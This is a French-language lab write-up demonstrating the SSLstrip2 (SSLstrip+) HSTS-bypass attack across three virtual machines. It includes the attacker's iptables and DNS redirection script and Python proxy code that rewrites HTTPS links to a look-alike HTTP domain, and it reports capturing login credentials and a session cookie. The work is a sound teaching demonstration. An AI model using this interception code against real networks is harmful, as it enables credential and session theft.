# Attaque SSLstrip2 (ou SSLstrip+)

Cette nouvelle version de SSLstrip, pensée par l'espagnol LeonardoNve, permet de passer au travers d'une sécurité ajoutée à TLS : le HSTS. Lorsqu'un client se connecte pour la première fois à un serveur en https, ce dernier va renvoyer un header indiquant à l'utilisateur (le navigateur) de toujours se connecter en https sur ce serveur (ou sur certaines pages spécifiques)

On ne va donc plus pouvoir simplement strip le 's' de https pour inciter le client à envoyer son post en http (et ainsi permettant à l'attaquer de voir tout le trafic en clair). Le navigateur emettra en effet une exception car il aura gardé en mémoire dans une base de donnée qu'il doit toujours se connecter en https sur le serveur en question.

Pour cette attaque, on suppose encore une fois que l'attaquant se situe en man in the middle. Lorsque le client va se connecter au serveur sur une page en http, l'attaquant va intercepter la réponse du serveur, et modifier sur cette page les liens qui renvoient vers du https. Si le lien est [https://www.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php), on va le remplacer par [http://wwww.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php). On peut enlever le 's' ici, car le navigateur ne connait pas ce nom de domain, il ne l'a encore jamais visité. Il va donc envoyer une requete DNS que l'attaquant va intercepter, et rediriger vers son serveur DNS à lui.

Ainsi il va faire croire au navigateur du client que tout est légitime, et que wwww.opeth.secure correspond bien au serveur distant. Le navigateur n'ayant pas enregistré dans sa base donnée qu'il devait se connecter en https sur wwww.opeth.secure, il va donc accepter d'envoyer sa requête POST en http, laissant encore une fois tout son traffic au clair aux yeux de l'attaquant !

# Configuration de l'environnement de test

L'environnement de test consiste en trois machines virtuelles :

- grave, la machine cliente et victime.

- opeth, la machine serveur.

- immortal, la machine attaquante, positionnée en homme du milieu.

Voici la [topology](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/topology) des machines mise en place :


```
### twolans
#
#  opeth - [s1] - immortal - [s2] - grave
#
#

# switches

SWITCH s1
SWITCH s2
HOST alpinex   grave    s2
HOST debian10  immortal s1 s2
HOST debian10  opeth    s1
```

Cette topologie n'est pas forcément réaliste car rare sont les cas où l'attaquant est dans le réseau du client attaqué.

Toutes les configurations initiales des machines se trouvent dans le fichier __"start.sh"__ de chaque dossier correspondant aux machines.

## Machine "grave" (147.210.13.2)

Cette machine utilise l'environnement graphique de la distribution Linux Alpine. Le navigateur firefox est utilisé pour la démonstration.

Au lancement de la machine, il faut ajouter le certificat de l'autorité de certification dans firefox, grâce à l'outil certutil. Se reporter au fichier [start.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/grave/start.sh) pour plus de détails.

## Machine "opeth" (147.210.12.1)

Cette machine héberge un serveur HTTP(s) Nginx sur le port 80 et 443. Le certificat utilisé pour les connections HTTPS a été généré avec openssl grâces aux scripts présents dans le dossier [CA](https://github.com/t00sh/mastercsi-ter/blob/master/CA). D'abord on crée une autorité de certification :

```
# Crée la clef root
openssl genrsa -out root-ca.key 4096

# Certificat auto-signé
openssl req -x509 -new -nodes -key root-ca.key -sha256 -days 512 -out root-ca.pem
```

Puis on peut créer un certificat pour le serveur opeth, signé avec la clef de l'autorité de certification que l'on vient de créer :

```
# Crée la clef privée
openssl genrsa -out cert.key 4096

# Crée la requête
openssl req -new -key cert.key -out cert.csr

# Signe le certificat avec la clef de la CA
openssl x509 -req -in cert.csr -CA root-ca.pem -CAkey root-ca.key -CAreateserial -out cert.pem -days 365 -sha256
```

Le serveur héberge deux sites :

  - le domaine [www.opeth.local](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/local/index.php) que l'on accéde en HTTP et présentant un formulaire de login.

  - le domaine [www.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php) que l'on accéde en HTTPS.

## Machine "immortal" (147.210.12.2 - 147.210.13.1)

C'est sur cette machine que se trouve le PoC de l'attaque, dans le fichier [/mnt/host/attack.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/attack.sh). Cette VM est configurée pour forwarder les paquets entre opeth et grave.

Si elle reçoit une requête DNS sur la chaîne iptables PREROUTING, alors elle redirige ce paquet sur son propre serveur DNS ([dnsmasq](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/dnsmasq.conf)) pour l'attaque.

------------------------------------------------------

# Démo

Pour lancer l'environnement de test, il faut lancer la commande suivante (on aura récupéré au préalable le dépôt [qemunet](https://gitlab.inria.fr/qemunet/core)) :

```
$ ./qemunet/qemunet.sh -x -S sslstrip2
```

À partir de là, les trois machines sont lancées.

## Étape 1 : avant l'attaque

Lorsque l'attaque n'est pas encore lancée, nous pouvons voir sur la machine grave que tout se passe normalement et que la requête POST passe bien en HTTPS (immortal est donc incapable de voir les identifiants envoyés) :

![screen1](../medias/sslstrip2/screen1.png?raw=true)

L'encadré rouge montre bien que le POST est effectué en HTTPS, sur la page secure.php.

![screen2](../medias/sslstrip2/screen2.png?raw=true)

Nous arrivons alors sur le domaine www.opeth.secure en HTTPS : immortal n'a pas pût voir nos échanges sur cette page sécurisée.

![screen3](../medias/sslstrip2/screen3.png?raw=true)

## Etape 2 : lancement de l'attaque

Comme expliqué précédement, pour lancer l'attaque, il faut exécuter le fichier __[/mnt/host/attack.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/attack.sh)__ depuis immortal. Voici son contenu :

```
PROXY_PORT=4242

iptables -t nat -F

# Redirection 80 -> PROXY
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PROXY_PORT

# Redirection 53 -> Dnsmasq
iptables -t nat -A PREROUTING -p udp -m state --state NEW --destination-port 53 -j REDIRECT --to-port 53

# Résout le domain attaqué
echo "147.210.12.1 www.opeth.local" > /etc/hosts
echo "147.210.12.1 www.opeth.secure" >> /etc/hosts
echo "147.210.12.1 wwww.opeth.secure" >> /etc/hosts
service dnsmasq restart
```

On peut constater que les flux TCP à destination du port 80 (HTTP) sont redirigées vers le port d'écoute du proxy qui est chargé d'analyser et traiter les requêtes. Aussi, les requêtes DNS sont redirigées vers le serveur DNS de l'attaquant.

Nous pouvons maintenant lancer l'attaque depuis la machine immortal :

![screen4](../medias/sslstrip/screen4.png?raw=true)

### Explication du code

#### Réception des requêtes

Lors de la réception de requêtes, il s'agit de savoir si l'on doit :

- fermer la connexion (le client ou le serveur a fermé la connection)
- établir une connexion https, dans le cas où le client va sur le domaine [wwww.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php)
- établir une connexion http, dans le cas où le client demande la page du domaine [www.opeth.local](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/local/index.php)

Le code est dans le fichier [sslstrip.py](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/sslstrip2.py). La fonction traitant les différentes requêtes est celle-ci :

```python
def __recv(self, csock):
        fw_sock = self.__csockets[csock]
        data = csock.recv(BUFFER_SIZE)
        if len(data) == 0:
            self.__close_conn(csock)
            self.__close_conn(fw_sock)
        else:
            print(data)

            if fw_sock is None:
                m = re.search(b'Host: (\S+)', data)
                if m is not None and m.group(1) == FAKE_HOST:
                    re.sub(b'Host: (\S+)',
                           b'Host: ' + bytes(FORWARD_HOST_HSTS), data)
                    self.__new_https_conn(csock)
                else:
                    self.__new_http_conn(csock)
                fw_sock = self.__csockets[csock]
            data = self.__replace_https_to_http(data)
            data = self.__replace_host(data)
            data = self.__replace_content_length(data)
            fw_sock.send(data)

```

À la fin, on transforme tous les liens __https__ trouvés en __http__ en remplaçant le nom de domaine [www.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php) par le faux nom de domaine [wwww.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php), on met l'entête Host vers le bon domaine et on recalcule la taille de la requête (entête Content-Length).

#### Transformation des liens

Dans cette fonction, nous utilisons une expression régulière afin de remplacer tous les liens [https://www.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php) en [http://wwww.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php).

```python
def __replace_https_to_http(self, data):
    return re.sub(b'https://' + bytes(FORWARD_HOST_HSTS),
                  b'http://' + bytes(FAKE_HOST), data)
```

#### Modification de l'entête Host

Lorsque la victime est redirigée vers un lien [http://wwww.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php), l'entête Host de ses requêtes sera éronné. Cette fonction modifie cette entête pour que le serveur puisse recevoir un Host correct.

```python
def __replace_host(self, data):
    return re.sub(b'Host: ' + bytes(FAKE_HOST),
                  b'Host: ' + bytes(FORWARD_HOST_HSTS), data)
```

#### Recalcul de l'entête Content-Length

La taille de la requête étant modifiée par le proxy, celui-ci doit recalculer l'entête Content-Length en se basant sur la chaîne "\r\n\r\n" signalant la fin des entêtes dans le protocole HTTP.

```python
def __replace_content_length(self, data):
    try:
        idx = data.index(b"\r\n\r\n")
        length = len(data) - idx - 4
        return re.sub(b'Content-Length: (\d+)',
                      b'Content-Length: %d' % length, data, 1)
    except:
        return data
```

## Etape 3 : pendant l'attaque

Lorsque l'attaque est lancée, on peut voir que le lien sensible [https://www.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php) est remplacé par [http://wwww.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php).
La machine immortal est donc capable d'intercepter les échanges réalisés sur le domaine www.opeth.secure.

Ici on voit dans l'encadré rouge, que le lien https:// a bien été remplacé par un lien non sécurisé http:// :

![screen5](../medias/sslstrip2/screen5.png?raw=true)

Nous constatons que nous arrivons sur la page secure.php en HTTP : notre navigation n'est pas sécurisée !

![screen6](../medias/sslstrip2/screen6.png?raw=true)

La machine immortal a été capable de capturer non seulement les identifiants du formulaire, mais également le cookie de session :

![screen7](../medias/sslstrip2/screen7.png?raw=true)
